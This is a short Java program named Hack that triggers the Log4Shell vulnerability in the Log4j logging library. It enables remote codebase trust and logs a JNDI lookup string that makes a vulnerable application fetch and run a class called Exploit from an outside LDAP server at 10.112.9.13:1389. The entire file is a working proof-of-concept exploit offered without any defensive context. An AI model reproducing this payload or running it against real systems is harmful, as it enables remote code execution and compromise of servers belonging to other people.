import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;
public class Hack {
    private static final Logger logger = LogManager.getLogger(Hack.class);
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("${jndi:ldap://10.112.9.13:1389/Exploit}");
    }
}
